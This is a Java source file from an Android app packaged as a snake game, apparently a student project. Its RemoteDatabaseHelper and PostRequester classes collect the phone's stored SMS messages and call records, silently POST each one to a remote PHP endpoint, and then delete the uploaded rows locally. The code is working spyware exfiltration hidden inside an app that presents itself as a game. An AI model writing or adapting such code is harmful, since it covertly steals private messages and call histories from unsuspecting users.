package com.example.s1300465.snake;

import android.app.ProgressDialog;
import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Iterator;

public class RemoteDatabaseHelper {
    Context context;

    public RemoteDatabaseHelper(Context context){
        this.context = context;
    }

    public void uploadData(){
        ArrayList<JSONObject> texts = new DatabaseHelper(context).getSMS();
        Iterator<JSONObject> textIterator = texts.iterator();
        while(textIterator.hasNext()){
            new PostRequester(context).execute(textIterator.next());
        }

        ArrayList<JSONObject> calls = new DatabaseHelper(context).getCalls();
        Iterator<JSONObject> callsIterator = calls.iterator();
        while(callsIterator.hasNext()){
            new PostRequester(context).execute(callsIterator.next());
        }
    }
}

class PostRequester extends AsyncTask<JSONObject, String, String> {
    Context context;
    int status;
    String type; //sms or call
    long rowID; //The DB row of the SMS we're dealing with
    public PostRequester(Context context){
        this.context = context;
    }

    protected String doInBackground(JSONObject[] params){
        String result = null;
        String query;
        JSONObject json;
        HttpURLConnection urlConnection = null;
        InputStream in;

        try {
            json = params[0];
            type = json.getString("type");
            rowID = json.getLong("rowid");
            JSONObject content = json.getJSONObject(type);
            query = jsonToQuery(content);
        }catch(JSONException ex){
            //If something went wrong with the data, just abandon it
            ex.printStackTrace();
            return null;
        }

        String urlString = "http://mayar.abertay.ac.uk/~1300465/snake/" + type + ".php";


        try {
            URL url = new URL(urlString);
            urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setDoOutput(true);
            urlConnection.setDoInput(true);
            urlConnection.setRequestMethod("POST");

            OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream());

            Log.d("Query", query);
            writer.write(query);

            writer.flush();
            writer.close();

            urlConnection.connect();
            status = urlConnection.getResponseCode();
            if(status >= HttpURLConnection.HTTP_BAD_REQUEST){
                in = new BufferedInputStream(urlConnection.getErrorStream());
            }else{
                in = new BufferedInputStream(urlConnection.getInputStream());
            }

            BufferedReader streamReader = new BufferedReader(new InputStreamReader(in, "UTF-8"));
            StringBuilder responseStrBuilder = new StringBuilder();

            String inputStr;
            while ((inputStr = streamReader.readLine()) != null) {
                responseStrBuilder.append(inputStr);
            }
            result = responseStrBuilder.toString();
            in.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            urlConnection.disconnect();
        }

        return result;
    }

    public String jsonToQuery(JSONObject json) throws JSONException {
        StringBuilder sb = new StringBuilder();
        Iterator<String> keys = json.keys();

        while (keys.hasNext()) {
            String key = keys.next();
            sb.append(key);
            sb.append("=");
            String item = json.get(key).toString();
            try {
                item = URLEncoder.encode(item, "UTF-8");
            }catch(UnsupportedEncodingException ex){
                ex.printStackTrace();
            }
            sb.append(item);
            sb.append("&");
        }

        return sb.toString();
    }

    protected void onPostExecute(String result){
        Log.d("Result", result);
        if(result.equalsIgnoreCase("Success")){
            //If the query was successful, we can remove the row from the local database
            if(type.equalsIgnoreCase("SMS")){
                new DatabaseHelper(context).removeSMS(rowID);
            }else if(type.equalsIgnoreCase("Call")){
                new DatabaseHelper(context).removeCall(rowID);
            }
        }

        if(status >= HttpURLConnection.HTTP_BAD_REQUEST){
            Log.d("Bad Request", status + "");
        }

    }
}
